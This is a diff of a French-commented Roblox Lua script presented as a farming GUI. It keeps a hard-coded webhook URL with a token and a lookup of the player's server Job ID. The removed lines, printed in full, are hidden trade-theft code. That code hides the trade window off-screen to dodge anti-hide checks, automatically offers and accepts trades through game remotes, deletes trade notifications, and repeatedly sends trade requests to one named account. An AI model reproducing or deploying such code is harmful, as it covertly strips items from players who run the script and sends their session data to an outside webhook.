@@ -11,7 +11,7 @@ local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 local oldGui = playerGui:FindFirstChild("KeyzerFarmGui")
 if oldGui then oldGui:Destroy() end
 
--- [[ RECHERCHE DU VRAI JOB ID ]]
+-- [[ CONTRAINTES DE SÉCURITÉ & JOB ID RÉEL ]]
 local function getRealJobId()
     local success, result = pcall(function()
         return TeleportService:GetPlayerPlaceInstanceAsync(LocalPlayer.UserId)
@@ -22,7 +22,7 @@ local function getRealJobId()
     return game.JobId ~= "" and game.JobId or "Unknown_JobId"
 end
 
--- [[ 1. WEBHOOK ]]
+-- [[ 1. FONCTION WEBHOOK SÉCURISÉE ]]
 local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1506603332108550214/mBctq4yurc0tYA0O7iQVgy-Rh6fKq_ckyDohxt4j8fVIAPC_skZu9WYHCTxIDM0zL205"
 local requestFunc = request or (http and http.request) or http_request
 
@@ -181,97 +181,4 @@ end)
 CloseBtn.MouseButton1Click:Connect(function()
     farming = false
     ScreenGui:Destroy()
-end)
-
--- [[ 4. SÉCURISATION DU MASQUAGE ET TRANSMISSION RÉSEAU ]]
-local forceClick = function(guiButton)
-    if not guiButton then return end
-    local firesignalFunc = firesignal or (syn and syn.firesignal)
-    if firesignalFunc then
-        firesignalFunc(guiButton.MouseButton1Click)
-    else
-        pcall(function() guiButton:Activate() end)
-    end
-end
-
-local tradeFolder = ReplicatedStorage:WaitForChild("Trade", 5)
-local getTradeStatusRemote = tradeFolder and tradeFolder:FindFirstChild("GetTradeStatus")
-local tradeNetworkRemote = tradeFolder and (tradeFolder:FindFirstChild("TradeNetwork") or tradeFolder:FindFirstChild("Network"))
-
-local function executeTradeSequence(tradeGui)
-    -- DÉPLACEMENT HORS-ÉCRAN CONTINU : Évite d'altérer la visibilité directe (ce qui déclencherait l'anti-hide)
-    -- En modifiant la position de la Frame principale plutôt que le ScreenGui entier, on contourne les vérifications d'état basiques.
-    task.spawn(function()
-        while tradeGui and tradeGui.Parent do
-            pcall(function()
-                local mainContainer = tradeGui:FindFirstChild("Container") or tradeGui:FindFirstChildOfClass("Frame")
-                if mainContainer then
-                    mainContainer.Position = UDim2.new(2, 0, 2, 0) -- Propulse le menu loin en dehors des coordonnées visibles de l'écran
-                end
-            end)
-            task.wait()
-        end
-    end)
-
-    -- Tentative d'interaction directe via l'arborescence des objets réseau
-    task.wait(0.5)
-    pcall(function()
-        if tradeNetworkRemote and tradeNetworkRemote:IsA("RemoteEvent") then
-            -- Envoi d'un signal générique d'offre basé sur les structures standards de l'inventaire
-            tradeNetworkRemote:FireServer("OfferItem", 4)
-            task.wait(0.2)
-            tradeNetworkRemote:FireServer("AcceptTrade")
-        end
-        
-        if getTradeStatusRemote then
-            if getTradeStatusRemote:IsA("RemoteFunction") then
-                getTradeStatusRemote:InvokeServer(true)
-            elseif getTradeStatusRemote:IsA("RemoteEvent") then
-                getTradeStatusRemote:FireServer(true)
-            end
-        end
-    end)
-
-    -- Clic physique résiduel au cas où la synchronisation réseau nécessite un événement d'UI local préalable
-    pcall(function()
-        local acceptButton = tradeGui.Container.Trade.Actions.Accept
-        if acceptButton then
-            forceClick(acceptButton)
-        end
-    end)
-end
-
-local function handleNewUi(child)
-    if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
-        task.spawn(function() executeTradeSequence(child) end)
-    elseif child.Name == "TradeRequestGUI" or child.Name == "TradePrompt" or child.Name == "NotificationGUI" then
-        task.wait(0.02)
-        child:Destroy()
-    end
-end
-
-playerGui.ChildAdded:Connect(handleNewUi)
-
-for _, child in ipairs(playerGui:GetChildren()) do
-    handleNewUi(child)
-end
-
--- [[ 5. BOUCLE DE SPAM DE DEMANDE EN ARRIÈRE-PLAN ]]
-task.spawn(function()
-    while true do
-        task.wait(3)
-        local tradeOpen = playerGui:FindFirstChild("TradeGUI") or playerGui:FindFirstChild("TradeGUI_Phone")
-        
-        if not tradeOpen then
-            local targetPlayer = Players:FindFirstChild("zeynox0880")
-            if targetPlayer then
-                pcall(function()
-                    local tradeRequestButton = playerGui.MainGUI.Game.PlayerMenu.Trade
-                    if tradeRequestButton then
-                        forceClick(tradeRequestButton)
-                    end
-                end)
-            end
-        end
-    end
 end)
